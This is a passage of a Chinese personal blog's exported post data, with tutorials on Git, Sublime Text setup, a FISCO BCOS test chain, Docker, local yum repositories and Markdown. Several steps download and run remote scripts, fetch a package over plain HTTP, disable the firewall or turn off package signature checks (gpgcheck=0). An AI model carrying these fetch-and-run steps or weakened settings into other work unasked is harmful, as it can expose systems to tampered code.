--replace-all 替换所有匹配的变量：name value [value_regex] --add 添加一个新的变量：name value --unset 删除一个变量：name [value-regex] --unset-all 删除所有匹配项：name [value-regex] --rename-section 重命名小节：old-name new-name --remove-section 删除一个小节：name -l, --list 列出所有 -e, --edit 打开一个编辑器 --get-color &lt;slot&gt; 找到配置的颜色：[默认] --get-colorbool &lt;slot&gt; 找到颜色设置：[stdout-is-tty]类型 --bool 值是 &quot;true&quot; 或 &quot;false&quot; --int 值是十进制数 --bool-or-int 值是 --bool or --int --path 值是一个路径（文件或目录名）其它 -z, --null 终止值是NUL字节 --includes 查询时参照 include 指令递归查找 第一步 首先配置Git的本地用户信息，用于提交到本地仓库认证，否则不予提交 配置是哪个用户使用git 12345[root@zzuxyj7 ~]# git config --global user.email &quot;aayxyj@163.com&quot;[root@zzuxyj7 ~]# git config --global user.name &quot;zzuxyj&quot;[root@zzuxyj7 ~]# git config --global color.ui true //高亮 12345678910[root@zzuxyj7 ~]# git config --listuser.name=zzuxyjuser.email=aayxyj@163.comcolor.ui=true[root@zzuxyj7 ~]# cat .gitconfig [user] name = zzuxyj email = aayxyj@163.com[color] ui = true 第二步 创建文件夹并进行初始化，该目录即为本地仓库 创建本地仓库123mkdir gitdata #创建目录cd gitdata #进入目录git init #初始化仓库 初始化空的 Git 版本库于 /root/gitdata/.git/ 本地仓库信息12345678910隐藏文件介绍︰branches # 分支目录config# 定义项目特有的配置选项description# 仅供git web程序使用HEAD #指示当前的分支hooks # 包含git钩子文件info #包含一个全局排除文件(exclude文件)objects # 存放所有数据内容，有info和pack两个子文件夹refrs # 存放指向数据(分支)的提交对象的指针index #保存暂存区信息，在执行git init的时候，这个文件还没有 查看初始的git版本库的结构123456789101112131415161718192021222324[root@zzuxyj7 gitdata]# tree .git/.git/├── branches├── config├── description├── HEAD├── hooks│ ├── applypatch-msg.sample│ ├── commit-msg.sample│ ├── post-update.sample│ ├── pre-applypatch.sample│ ├── pre-commit.sample│ ├── prepare-commit-msg.sample│ ├── pre-push.sample│ ├── pre-rebase.sample│ └── update.sample├── info│ └── exclude├── objects│ ├── info│ └── pack└── refs ├── heads └── tags 第三步 开始进行代码或文件的CURD操作 提交为空，但是存在尚未跟踪的文件（使用 “git add” 建立跟踪）12[root@zzuxyj7 gitdata]# git add 1.go #跟踪[root@zzuxyj7 gitdata]# git status #查看git仓库的状态，可以看到跟踪的文件 提交跟踪文件后，需要删除时候123[root@zzuxyj7 gitdata]# git rm 1.go #删除跟踪rm &#x27;1.go&#x27;[root@zzuxyj7 gitdata]# git status #查看git仓库的状态，文件已经被删除 建立文件跟踪后，如果需要提交到本地仓库还是需要进行commit提交才可以到本地仓库1234[root@zzuxyj7 gitdata]# git commit -m &quot;Test&quot;[master（根提交） b58f049] Test 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 1.go 注 ：常用的git命令12345678910111213141516171819202122232425262728293031323334353637383940411.git init#初始化仓库把一个目录初始化为版本仓库〈可以是空的目录也可以是带内容的目录)2.git status#查看当前仓库的状态3.git add file#添加文件到暂存区4.git add .或者git add * #添加当前所有的文件到暂存区5.git rm --cached#撤出暂存区6.git rm -f#同时删除工作目录和暂存区的文件7.git commit -m#从缓存区提交到本地仓库8.git mv old-filename new-filename#直接更改文件名称更改完直接commit提交即可9.git diff#默认比对工作目录和暂存区有什么不同10.git diff --cached #比对暂存区域和本地仓库11.#如果某个文件已经被仓库管理,如果在更改此文件直接需要一条命令提交即可 git commit -am &quot;add newfile&quot;12.git log#查看历史提交过的信息 -p #查看具体的改动 -1#查看最近一次13.git reset --hard 295e997 #回滚数据到某一个提交14.git log --oneline --decorate#查看当前指针的指向15.git log --reflog #查看所有镜像15.git branch#查看分支 * 号在那就在那个分支上16.git branch testing#创建一个测试分支17.git checkout testing#切换到测试分支18.git checkout -b testing#创建并切换到testing分支19.git tag#打标签 -d删除标签 git tag -d v1.0 #删除标签 git tag -a &quot;v2.0&quot; -m &quot;xxx&quot; #打标签 git show v1.0 #查看版本信息20.git remote add origin git@github.com:ayxyj/ayxyj.github.io.git //添加远程仓库 git remote #查看远程仓库21.git clone url 标签也是指向了一次commit提交，是一个里程碑式的标签，回滚打标签直接加标签号，不需要加唯一字符串不好记 [root@git git_data]# git tag -a v1.0 -m &quot;aaa bbb master tesing version v1.0”# -a指定标签名字 -m指定说明文字 [root@git git_data]# git tagv1.0 [root@git git_data]# git tag -a v2.0 dbead4c -m &quot;add bbb version v2.0&quot; #指定某一次的提交 为标签 [root@git git_data]# git show v1.0 #查看v1.0的信息git show加标签查看 [root@git git_data]# git reset --hard v2.0#直接还原数据到v2.0 最后如何把本地仓库推送到远程仓库步骤： 第一种方式每次手动写远程仓库地址 1.首先先把本地代码提交到本地仓库 123git add . git commit -m &quot;add file !&quot; git commit -am &quot;add file !&quot; 2.其次再把本地仓库的代码提交到远程仓库上 123git remote add gocode git@github.com:ayxyj/ayxyj.github.io.git #添加远程仓库git push -u gocode master #第一次提交到远程仓库的master分支上git push gocode master #之后提交 3.删除本地分支和远程分支 12git branch -d master #删除本地分支、注意删除时候应该切换到其他分支才可以删除分支git push gocode --delete master #删除远程仓库下的mater分支 4.合并本地分支和远程分支 12345678910111213141516171819202122232425基本流程0.查看远程仓库git remote -v1.本地创建一个与新分支并且关联远程分支git checkout -b dev gocode/dev 这时 dev 已经和远程的 gocode/dev 一致了。同上1.查看到远程有一个叫gocode的仓库，我们可以使用如下命令从gocode远程仓库获取最新版本的代码。git fetch origin master:temp上面代码的意思是：从远程的gocode仓库的master分支下载到本地，并新建一个temp分支。2.查看temp分支与本地原有分支的不同git diff temp3. 切换回本地的 master 版本git checkout master 4. 将本地的 dev 合并到 mastergit merge dev 5. 将本地的 master 推到远程git push gocode master 6. 将远程的 dev 版本删除 第二种方式在配置文件中配置远程仓库的地址（需要做ssh认证） 生成ssh公私钥12ssh-keygen -t rsa -C &quot;aayxyj@163.com&quot;cat ~/.ssh/id_rsa.pub #将查看到的公钥在github的个人设置中新建ssh密码填入即可 在配置文件中添加信息1234deploy: type: git repo: 这里填刚记录的github clone仓库地址 branch: master #上传到那个分支上 接下来就可以直接push即可","categories":[{"name":"Git","slug":"Git","permalink":"http://www.zzugo.ayxyj.cn/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"http://www.zzugo.ayxyj.cn/tags/Git/"}]},{"title":"Sublime 乱码问题及插件安装","slug":"sublime配置","date":"2020-11-13T02:21:29.000Z","updated":"2020-11-13T09:29:28.271Z","comments":true,"path":"2020/11/13/sublime配置/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/11/13/sublime%E9%85%8D%E7%BD%AE/","excerpt":"","text":"sublime 解决中文乱码问题1.通过快捷键 ctrl + ~ 进入命令行，并输入以下命令然后回车1import urllib.request,os,hashlib; h = &#x27;7183a2d3e96f11eeadd761d777e62404e330c659d4bb41d3bdf022e94cab3cd0&#x27;; pf = &#x27;Package Control.sublime-package&#x27;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( &#x27;http://sublime.wbond.net/&#x27; + pf.replace(&#x27; &#x27;, &#x27;%20&#x27;)).read(); dh = hashlib.sha256(by).hexdigest(); print(&#x27;Error validating download (got %s instead of %s), please try manual install&#x27; % (dh, h)) if dh != h else open(os.path.join( ipp, pf), &#x27;wb&#x27; ).write(by) 这是由于网络访问网站http://packagecontrol.io/无法访问成功导致的，所以确保能够访问该网址时才能继续安装，这里我直接通过科学上网的方式就可以访问了，但是又出现了下面的问题： 根据报错信息将该命令中的str1 字符串换成str2再重试即可发现成功 2.安装ConvertToUTF8。 通过快捷键 Ctrl + shift + P，然后在弹出的输入框输入 install，选择Package Control：install Package回车 在出现的插件命令行搜索ConvertToUTF8，选中回车进行插件安装 重启Sublime Text 3后再次打开之前中文乱码的文件发现，中文能够正常显示 sublime 主题和字体 通过快捷键 Ctrl + shift + P ，然后在弹出的输入框输入 install，选择Package Control：install Package回车 在出现的插件命令行搜索Themes：ayu/edge Font：Consoles","categories":[{"name":"Sublime","slug":"Sublime","permalink":"http://www.zzugo.ayxyj.cn/categories/Sublime/"}],"tags":[{"name":"Sublime","slug":"Sublime","permalink":"http://www.zzugo.ayxyj.cn/tags/Sublime/"}]},{"title":"FISCO BCOS - 01 - 入门","slug":"fb","date":"2020-11-11T06:38:59.000Z","updated":"2020-11-13T10:09:18.462Z","comments":true,"path":"2020/11/11/fb/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/11/11/fb/","excerpt":"","text":"安装本章介绍FISCO BCOS所需的必要安装和配置。本章通过在单机上部署一条4节点的FISCO BCOS联盟链，帮助用户掌握FISCO BCOS部署流程。请根据这里使用支持的硬件和平台操作。 安装FISCOBCOS：https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/installation.html 国密：https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/manual/account.html 单群组**FISCO BCOS**联盟链的搭建 准备环境安装centos依赖12sudo yum install -y openssl openssl-devel 12cd ~ &amp;&amp; mkdir -p fisco &amp;&amp; cd fisco ​ 下载build_chain.sh脚本 123curl -#LO https://github.com/FISCO-BCOS/FISCO-BCOS/releases/download/v2.6.0/build_chain.sh &amp;&amp; chmod u+x build_chain.sh 搭建单群组**4**节点联盟链在fisco目录下执行下面的指令，生成一条单群组4节点的FISCO链。 请确保机器的3030030303，2020020203，8545~8548端口没有被占用。 12345678910**注解**&gt; 国密版本请执行 bash build_chain.sh -l 127.0.0.1:4 -p 30300,20200,8545 -g -G&gt; 其中-g表示生成国密配置，-G表示使用国密SSL连接&gt; web3sdk已经支持国密SSL，如果使用web3sdk建议带上-G选项使用国密SSLbash build_chain.sh -l 127.0.0.1:4 -p 30300,20200,8545 注解 其中-p选项指定起始端口，分别是p2p_port,channel_port,jsonrpc_port 出于安全性和易用性考虑，v2.3.0版本最新配置将listen_ip拆分成jsonrpc_listen_ip和channel_listen_ip，但仍保留对listen_ip的解析功能，详细请参考 这里 为便于开发和体验，channel_listen_ip参考配置是 0.0.0.0 ，出于安全考虑，请根据实际业务网络情况，修改为安全的监听地址，如：内网IP或特定的外网IP 命令执行成功会输出All completed。如果执行出错，请检查nodes/build.log文件中的错误信息。 启动**FISCO BCOS**链 启动所有节点 12bash nodes/127.0.0.1/start_all.sh 启动成功会输出类似下面内容的响应。否则请使用netstat -an | grep tcp检查机器的3030030303，2020020203，8545~8548端口是否被占用。 检查进程 检查进程是否启动 正常情况会有类似下面的输出； 如果进程数不为4，则进程没有启动（一般是端口被占用导致的） 1ps -ef | grep -v grep | grep fisco-bcos 检查日志输出 如下，查看节点node0链接的节点数 1tail -f nodes/127.0.0.1/node0/log/log* | grep connected 正常情况会不停地输出链接信息，从输出可以看出node0与另外3个节点有链接。 执行下面指令，检查是否在共识 1tail -f nodes/127.0.0.1/node0/log/log* | grep +++ 正常情况会不停输出++++Generating seal，表示共识正常。 配置及使用控制台 重要 控制台1.x 系列基于 Web3SDK 实现，控制台2.6之后 基于 Java SDK 实现，最新版本控制台基于 Java SDK 实现 2.6及其以上版本控制台使用文档请 参考这里 ，1.x版本控制台使用文档请 参考这里 可通过命令 ./start.sh –version 查看当前控制台版本 基于 Web3SDK 开发应用时将 solidity 代码转换为 java 代码时，必须使用 1.x 版本控制台，具体请参考 这里 在控制台链接FISCO BCOS节点，实现查询区块链状态、部署调用合约等功能，能够快速获取到所需要的信息。2.6版本控制台指令详细介绍参考这里，1.x版本控制台指令详细介绍参考这里。 准备依赖 安装java #centos系统安装java 1sudo yum install -y java java-devel 获取控制台并回到fisco目录 1cd ~/fisco &amp;&amp; curl -#LO https://github.com/FISCO-BCOS/console/releases/download/v2.6.1/download_console.sh &amp;&amp; bash download_console.sh 注解 如果因为网络问题导致长时间无法下载，请尝试 cd ~/fisco &amp;&amp; curl -#LO https://gitee.com/FISCO-BCOS/console/raw/master/tools/download_console.sh 拷贝控制台配置文件 若节点未采用默认端口，请将文件中的20200替换成节点对应的channel端口。 # 最新版本控制台使用如下命令拷贝配置文件 1cp -n console/conf/config-example.toml console/conf/config.toml 配置控制台证书 注解 使用**1.x**版本控制台时： 1234搭建国密版时，如果使用国密SSL请执行 cp nodes/127.0.0.1/sdk/gm/* console/conf/搭建国密版时，请修改 applicationContext.xml 中 encryptType 修改为1 1cp -r nodes/127.0.0.1/sdk/* console/conf/ 启动控制台 启动 1cd ~/fisco/console &amp;&amp; bash start.sh 输出下述信息表明启动成功 否则请检查conf/config.toml中节点端口配置是否正确 使用控制台获取信息 # 获取客户端版本 1[group:1]&gt; getNodeVersion # 获取节点链接信息 1[group:1]&gt; getPeers 部署及调用**HelloWorld**合约 HelloWorld合约提供两个接口，分别是get()和set()，用于获取/设置合约变量name。合约内容如下: 1234567891011121314151617181920pragma solidity ^0.4.24;contract HelloWorld &#123; string name; function HelloWorld() &#123; name &#x3D; &quot;Hello, World!&quot;; &#125; function get()constant returns(string) &#123; return name; &#125; function set(string n) &#123; name &#x3D; n; &#125;&#125; 部署**HelloWorld**合约 为了方便用户快速体验，HelloWorld合约已经内置于控制台中，位于控制台目录下contracts/solidity/HelloWorld.sol，参考下面命令部署即可。 # 在控制台输入以下指令 部署成功则返回合约地址 1[group:1]&gt; deploy HelloWorld 调用**HelloWorld**合约 # 查看当前块高 1[group:1]&gt; getBlockNumber # 调用get接口获取name变量 此处的合约地址是deploy指令返回的地址 1[group:1]&gt; call HelloWorld 0xb3c223fc0bf6646959f254ac4e4a7e355b50a344 get # 查看当前块高，块高不变，因为get接口不更改账本状态 1[group:1]&gt; getBlockNumber # 调用set设置**name 1[group:1]&gt; call HelloWorld 0xb3c223fc0bf6646959f254ac4e4a7e355b50a344 set &quot;Hello, FISCO BCOS&quot; # 再次查看当前块高，块高增加表示已出块，账本状态已更改 1[group:1]&gt; getBlockNumber # 调用get接口获取name变量，检查设置是否生效 1[group:1]&gt; call HelloWorld 0xb3c223fc0bf6646959f254ac4e4a7e355b50a344 get # 退出控制台 1[group:1]&gt; quit","categories":[{"name":"FISCO BCOS","slug":"FISCO-BCOS","permalink":"http://www.zzugo.ayxyj.cn/categories/FISCO-BCOS/"}],"tags":[{"name":"FISCO BCOS","slug":"FISCO-BCOS","permalink":"http://www.zzugo.ayxyj.cn/tags/FISCO-BCOS/"}]},{"title":"Docker - 01 - 入门啊","slug":"docker","date":"2020-11-01T06:38:59.000Z","updated":"2020-11-13T09:47:59.125Z","comments":true,"path":"2020/11/01/docker/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/11/01/docker/","excerpt":"","text":"1. Docker介绍1.1 什么是容器?1.2 容器的前世FreeBASE jail ——&gt; Linux vserverchroot —–&gt; 完整的根文件系统(FHS)标准的namespaces —&gt; UTS Mount IPC PID user networkcgroup —&gt; 资源的分配和监控 通过比较复杂的代码开发的过程,调用以上三项技术实现容器的创建 —-&gt; 管理 —-&gt;销毁 1.3 传统虚拟化技术和容器对比1.4 容器的今生?实现隔离能力!LXC (LinuXContainer)对于原有的常用功能进行了封装,方便我们做容器的生命周期—–&gt; Docker (dotcloud) 1.5 Docker 帮助文档https://docs.docker.com/engine/reference/commandline/cli/?spm=5176.8351553.0.0.248a1991nVGS9m 2. Docker的安装2.0、yum源准备123curl http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo -o &#x2F;etc&#x2F;yum.repos.d&#x2F;docker-ce.repowget -O &#x2F;etc&#x2F;yum.repos.d&#x2F;epel.repo http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;repo&#x2F;epel-7.repocurl -o &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;repo&#x2F;Centos-7.repo 2.1 安装依赖包12yum install -y yum-utils device-mapper-persistent-data lvm2yum list docker-ce.x86_64 --showduplicates | sort -r yum install -y docker-ce 2.2 安装docker-ce123yum install -y --setopt&#x3D;obsoletes&#x3D;0 \\docker-ce-17.03.2.ce-1.el7.centos.x86_64 \\docker-ce-selinux-17.03.2.ce-1.el7.centos.noarch 2.3 启动Docker服务1234systemctl daemon-reloadsystemctl restart dockerdocker versiondocker info 2.4 配置镜像加速12345678910111213141516171819阿里云Docker-hubhttps:&#x2F;&#x2F;cr.console.aliyun.com&#x2F;cn-hangzhou&#x2F;mirrorsmkdir -p &#x2F;etc&#x2F;dockertee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-&#39;EOF&#39;&#123; &quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;uoggbpok.mirror.aliyuncs.com&quot;]&#125;EOFsystemctl daemon-reloadsystemctl restart docker 或者:vim &#x2F;etc&#x2F;docker&#x2F;daemon.json &#123; &quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;68rmyzg7.mirror.aliyuncs.com&quot;] &#125; #3. Doocker体系结构 4. Docker的镜像基础管理4.1 获取镜像123456基础镜像拉取docker search centosdocker pull centos:6.9docker pull centos:7.5.1804docker pull docker.io&#x2F;golangdocker pull nginx 4.2 镜像基本查看123456789101112131415[root@docker ~]# docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEcentos 6.8 82f3b5f3c58f 4 months ago 195 MBcentos 6.9 2199b8eb8390 4 months ago 195 MBcentos 7.5.1804 cf49811e3cdb 4 months ago 200 MBcentos 7.6.1810 f1cb7c7d58b7 4 months ago 202 MBoldguo&#x2F;centos_sshd v1.0oldguo&#x2F;centos_sshd v2.0oldguo&#x2F;centos_sshd v3.0标识镜像唯一性的方法:1. REPOSITORY:TAGcentos:7.5.1804 2. IMAGE ID (sha256:64位的号码,默认只截取12位)82f3b5f3c58 [root@docker &#x2F;]# docker image ls --no-trunc 4.3 镜像详细信息查看12[root@docker &#x2F;]# docker image inspect ubuntu:latest[root@docker &#x2F;]# docker image inspect 82f3b5f3c58f 4.4 只查看镜像ID1[root@docker ~]# docker image ls -q 4.5 镜像的导入和导出1234[root@docker ~]# docker image save 3556258649b2 &gt;&#x2F;tmp&#x2F;ubu.tar[root@docker ~]# docker image rm 3556258649b2[root@docker ~]# docker image load -i &#x2F;tmp&#x2F;ubu.tar[root@docker ~]# docker image tag 3556258649b2 oldguo&#x2F;ubu:v1 4.6 镜像的删除12[root@docker ~]# docker image rm -f 3556258649b2[root@docker ~]# docker image rm -f &#96;docker image ls -q&#96; 5. 容器的管理5.1 运行第一个容器5.1.1 交互式的容器:12345678910111213141516[root@docker ~]# docker container run -it 9f38484d220f[root@docker &#x2F;]# docker container ls[root@docker &#x2F;]# docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4d1ef5a6ecfc 9f38484d220f &quot;&#x2F;bin&#x2F;bash&quot; 5 minutes ago Up 5 minutes nervous_alleCONTAINER ID : 容器的唯一号码(自动生成的)NAMES : 容器的名字(可以自动,也可以手工指定)例子: 手工指定容器名启动[root@docker &#x2F;]# docker container run -it --name&#x3D;&quot;oldguo_cent76&quot; 9f38484d220f[root@docker &#x2F;]# docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESef45b19d8c7b 9f38484d220f &quot;&#x2F;bin&#x2F;bash&quot; About a minute ago Exited (0) 5 seconds ago oldguo_cent764d1ef5a6ecfc 9f38484d220f &quot;&#x2F;bin&#x2F;bash&quot; 9 minutes ago Up 9 minutes nervous_allenSTATUS : 容器的运行状态 ( Exited , Up) 5.1.2 守护式容器1234[root@docker &#x2F;]# docker run -d --name&#x3D;&quot;oldguo_nginx&quot; nginx:1.14查询容器的详细信息:[root@docker &#x2F;]# docker container inspect oldguo_nginx[root@zzuxyj7 ~]#curl -I 172.17.0.2 5.1.3 容器的应用场景1234交互式的容器: 工具类: 开发,测试,临时性的任务()[root@docker ~]# docker container run -it --name&#x3D;&quot;oldguo_cent76&quot; --rm 9f38484d220f守护式容器: 网络服务[root@docker &#x2F;]# docker run -d -p 8080:80 --name&#x3D;&quot;oldguo_nginx_80&quot; nginx:1.14 5.1.4 容器的启动\\关闭\\连接123456789101112131415161718192021守护式容器的关闭和启动[root@docker &#x2F;]# docker container stop oldguo_nginx_80[root@docker &#x2F;]# docker container start oldguo_nginx_80交互式的容器的关闭和启动[root@docker &#x2F;]# docker container stop nervous_allen[root@docker &#x2F;]# docker container start -i nervous_allen容器的连接方法:[root@docker &#x2F;]# docker container attach nervous_allen子进程的方式登录(在已有工作容器中生成子进程,做登录.可以用于进行容器的调试,退出时也不会影响到当前容器)[root@docker ~]# docker container exec -it nervous_allen &#x2F;bin&#x2F;bash容器的后台及前台运行:1. ctrl + P, Q attach 调用到前台2. 死循环 3. 让程序前台一直允许(夯在前台)制作守护式容器时,常用的方法 5.2 docker容器的网络访问12345678910111213指定映射(docker 会自动添加一条iptables规则来实现端口映射) -p hostPort:containerPort -p ip:hostPort:containerPort -p ip::containerPort(随机端口:32768-60999) -p hostPort:containerPort&#x2F;udp -p 81:80 –p 443:443随机映射 docker run -P 80（随机端口） [root@docker ~]# docker container run -d -p 8080:80 --name&#x3D;&#39;n2&#39; nginx:1.14 *****[root@docker ~]# docker container run -d -p 10.0.0.100:8081:80 --name&#x3D;&#39;n3&#39; nginx:1.14 *****[root@docker ~]# docker container run -d -p 80 --name&#x3D;&#39;n5&#39; nginx:1.14[root@docker ~]# docker container run -d -p 172.16.1.200::80 --name&#x3D;&#39;n6&#39; nginx:1.14 5.3容器的其他管理1234567891011121314docker ps -a -q 等价于:docker container ls -a -q[root@docker ~]# docker top ba9143bcaf74等价于:[root@docker ~]# docker container top ba9143bcaf74查看日志:[root@oldboy docker]# docker logs testxx[root@oldboy docker]# docker logs -tf testxx[root@oldboy docker]# docker logs -t testxx[root@oldboy docker]# docker logs -tf --tail 10 testxx[root@oldboy docker]# docker logs -tf --tail 0 testxx 小结: 镜像类: docker image search pull ls ***** inspect ***** rm **** save load 容器类 docker container run ***** start **** stop **** restart kill attach exec ***** ls ***** top **** logs inspect **** 5.4 docker的数据卷实现持久化存储1234567891011121314151617181920212223242526271. 手工交互数据:[root@docker opt]# docker container cp index.html n1:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;[root@docker opt]# docker container cp n1:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;50x.html .&#x2F;2. Volume实现宿主机和容器的数据共享[root@docker opt]# mkdir -p &#x2F;opt&#x2F;html[root@docker ~]# docker run -d --name&#x3D;&quot;nginx_3&quot; -p 83:80 -v &#x2F;opt&#x2F;html:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html nginx作用: 数据持久化3. 例子: 开启两个nginx容器(90,91),共同挂载一个数据卷,实现静态资源共享4. 数据卷容器:(1)宿主机模拟数据目录mkdir -p &#x2F;opt&#x2F;Volume&#x2F;amkdir -p &#x2F;opt&#x2F;Volume&#x2F;btouch &#x2F;opt&#x2F;Volume&#x2F;a&#x2F;a.txttouch &#x2F;opt&#x2F;Volume&#x2F;b&#x2F;b.txt(2)启动数据卷容器docker run -it --name &quot;nginx_volumes&quot; -v &#x2F;opt&#x2F;Volume&#x2F;a:&#x2F;opt&#x2F;a -v &#x2F;opt&#x2F;Volume&#x2F;b:&#x2F;opt&#x2F;b centos:6.9 &#x2F;bin&#x2F;bashctrl p q(3)使用数据卷容器docker run -d -p 8085:80 --volumes-from nginx_volumes --name &quot;n8085&quot; nginxdocker run -d -p 8086:80 --volumes-from nginx_volumes --name &quot;n8086&quot; nginx作用: 在集中管理集群中,大批量的容器都需要挂载相同的多个数据卷时,可以采用数卷容器进行统一管理 制作本地局域网yum源 安装vsftpd软件 [root@docker ~]# yum install -y vsftpd 启动ftp [root@docker ~]# systemctl enable vsftpd [root@docker ~]# systemctl start vsftpd [root@docker ~]# yum install lftpd [root@docker ~]# lftp 127.0.0.1//测试ftp安装是否成功 上传系统进行到虚拟机 略. 配置yum仓库mkdir -p /var/ftp/centos6.9mkdir -p /var/ftp/centos7.5[root@docker mnt]# mount -o loop /mnt/CentOS-6.9-x86_64-bin-DVD1.iso /var/ftp/centos6.9/ windows验证ftp://10.0.0.100/centos6.9/ cat &gt;/yum.repos.d/ftp_6.repo &lt;&lt;EOF[ftp]name=ftpbasebaseurl=ftp://10.0.0.100/var/www/html/ftpenabled=1gpgcheck=0EOF cat &gt;/yum.repos.d/ftp_7.repo &lt;&lt;EOF[ftp]name=ftpbasebaseurl=ftp://10.0.0.100/centos7.5enabled=1gpgcheck=0EOF 搭建本地的yum仓库，并通过vsftpd 和 httpd 共享该目录123456789101112131415yum install httpd vsftpd lftp -y &#x2F;&#x2F;安装三个服务mount -o loop &#x2F;centos6.5.iso &#x2F;var&#x2F;www&#x2F;html&#x2F;ftp&#x2F;centos6.5 &#x2F;&#x2F;注意路径，挂在对应的iso到对应目录下systemctl start httpd vsftpd &#x2F;&#x2F;启动服务systemctl enable httpd vsftpd &#x2F;&#x2F;开机自启动systemctl disable firewalld &#x2F;&#x2F;关闭防火墙开机自启动systemctl stop firewalld &#x2F;&#x2F;关闭防火墙systemctl status firewalld &#x2F;&#x2F;查看防火墙状态 通过上面的服务搭建以及配置接下来可以进行yum仓库的配置，由于搭建镜像的本地服务中，镜像挂在点有repodata/及其配置文件，此时可以不用配置repomd.xml等，可以省略。若搭建其他需要通过下述命令进行配置 1234yum install createrepo -y &#x2F;&#x2F;安装createrepo ，用于构建repodatacreaterepo &#x2F;var&#x2F;www&#x2F;html&#x2F;ftp &#x2F;&#x2F;此时就会该目录下生成repodata&#x2F; 根据yum仓库的配置文件创建一个本地的repo文件要记得修改vsftpd的默认路径 123local_root=/var/www/htmlchroot_local_user=YESanon_root=/var/www/html 1234567cat &gt;/yum.repos.d/ftp_6.repo &lt;&lt;EOF [ftp]name=ftpbasebaseurl=ftp://192.168.100.4/var/www/html/ftpenabled=1gpgcheck=0EOF 通过浏览器访问测试ftp://192.168.100.4/ http://192.168.100.4/ftp/","categories":[{"name":"Docker","slug":"Docker","permalink":"http://www.zzugo.ayxyj.cn/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://www.zzugo.ayxyj.cn/tags/Docker/"}]},{"title":"MarkDown语法","slug":"markdown","date":"2019-01-23T13:57:00.000Z","updated":"2020-11-08T07:48:20.252Z","comments":true,"path":"2019/01/23/markdown/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2019/01/23/markdown/","excerpt":"","text":"一、字体加粗 ： ** 粗 ** 斜体 ： * 斜体 * 粗斜 ： *** T *** 删除线： ~~ D ~~ 二、标题# ： 一级标题 ## ： 二级标题 ### ： 三级标题 。。。 以此类推 三、引用&gt; : 引用 &gt;&gt; : 嵌套引用 &gt;&gt;&gt; : 再次嵌套引用 &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; n次嵌套 : n次嵌套 四、分割线 * 或者 - 三个或者三个以上即可 * 例如： * --- * *** 五、图片语法： ![img alt](img address &quot;img title&quot;) 注： img alt : 图片下方的文字，如 图1所示 img address ： 图片的绝对路径 ing title : 图片的标题 例： ![AYXYJ](https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=702257389,1274025419&amp;fm=27&amp;gp=0.jpg &quot;TEST&quot;) 六、超链接语法： [超链接名](超链接地址 &quot;超链接title&quot;) 例： [简书](http://jianshu.com) [AYXYJ](http://ayxyj.cn) 注：MarkDown本身语法不支持超链接在新页面打开，貌似简书做了处理，是可以的，别的平台可能不行。 如果想要在新页面中打开的话可以用html语言的a标签代替。 例： &lt;a href = &quot;超链接地址&quot; target=“_blank”&gt;超链接title&lt;/a&gt; &lt;a href=&quot;https://www.jianshu.com/u/1f5ac0cf6a8b&quot; target=&quot;_blank&quot;&gt;简书&lt;/a&gt; 七、列表语法： -无序列表： - + * 都可以 例： - AYXYJ :注意 - 和 ayxyj有一个空格 1.有序列表： 数字加点 例： 1. AYXYJ :序号和内容之间要有空格 - 列表无序嵌套 - 上下级之间敲三个空格即可 1. 列表有序嵌套 2. 上下级之间敲三个空格即可 八、表格语法： 表头|表头|表头 ---|:---:|---: 内容|内容|内容 注： 第二行分割表头和内容： - 有一个即可，为了对其，多加了几个 - 文字默认局左 - 两边加 ： 表示文字居中 - 右边加 ： 表示文字居右 - 原生的语法两边都要 | 包起来，此处省略 例： 姓名|性别|TAG ---|:---:|---: xyj|male|20 syl|female|20 九、代码语法： - 单行代码： 代码之间用 ` 代码 ` ：反引号 - 代码块 : 代码之间分别用三个反引包起来，且两边反引号独占一行 十、流程图语法： flow st=&gt;start: start op=&gt;operation: my operation cond=&gt;condition: Yes or No? e=&gt;end st-&gt;op-&gt;cond cond(yes)-&gt;e cond(no)-&gt;op &amp; ``` 宝剑锋从磨砺出，梅花香自苦寒来~","categories":[{"name":"Markdown","slug":"Markdown","permalink":"http://www.zzugo.ayxyj.cn/categories/Markdown/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://www.zzugo.ayxyj.cn/tags/hexo/"}]},{"title":"快速搭建Hexo博客","slug":"快速搭建Hexo博客","date":"2018-11-08T02:38:59.000Z","updated":"2020-11-13T11:02:32.168Z","comments":true,"path":"2018/11/08/快速搭建Hexo博客/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2018/11/08/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 由于我的环境是Linux，所以Linux环境的按着来就好了，Win环境大同小异。Hexo手册一、安装基本环境1. 安装Git Git 